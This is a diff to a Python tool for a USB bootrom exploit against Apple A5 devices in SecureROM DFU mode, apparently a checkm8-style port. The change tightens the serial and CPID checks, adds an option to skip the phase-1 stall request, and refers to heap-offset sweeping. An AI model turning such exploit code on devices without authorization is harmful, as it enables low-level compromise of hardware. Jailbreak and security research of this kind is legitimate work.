@@ -919,15 +919,20 @@ def exploit_native(args):
     print('== phase 1: req_stall + %d sync leaks (wLength 0x80) =='
           % args.leak)
     dev, handle, desc, serial = acquire(usb, want_serial=False)
-    if not sys_serial:
-        serial = serial or sys_serial
+    serial = (sys_serial or serial or '')
     if 'CPID:%04X' % CPID_A5 not in serial:
         usb.release(handle)
         raise SystemExit('error: not an A5 device. Serial: %s' % serial.strip())
-    rc, info = usb.raw_ctrl(handle, 0x02, 3, 0, 0x80, 0, b'',
-                            abandon=False, timeout_ms=200, name='req_stall')
-    if args.debug:
-        debug_raw('req_stall', rc, info)
+    if SRTG_A5 not in serial:
+        usb.release(handle)
+        raise SystemExit('error: CPID is A5 but serial lacks %s — not in '
+                         'SecureROM DFU (LLB/iBSS DFU?). Re-enter DFU from a '
+                         'powered-off state.' % SRTG_A5)
+    if not args.skip_req_stall:
+        rc, info = usb.raw_ctrl(handle, 0x02, 3, 0, 0x80, 0, b'',
+                                abandon=False, timeout_ms=200, name='req_stall')
+        if args.debug:
+            debug_raw('req_stall', rc, info)
     done = 0
     stalls = 0
     consecutive_stalls = 0
@@ -1051,6 +1056,9 @@ def main():
                              'io_buffer; 0x40-aligned, 0x40..0x780. The PC heap '
                              'layout can shift it from the Arduino value, so sweep '
                              'it in 0x40 steps (default: 0x6C0)')
+    parser.add_argument('--skip-req-stall', action='store_true',
+                        help='native mode: do not send the CLEAR_FEATURE '
+                             'req_stall in phase 1 (838.3 hangs EP0 after it)')
     parser.add_argument('--mode', choices=['sketch', 'native'], default='sketch',
                         help='exploit sequence: sketch = the a1exdandy Arduino '
                              'transliteration (stages 0-3, raw-packet shapes); '
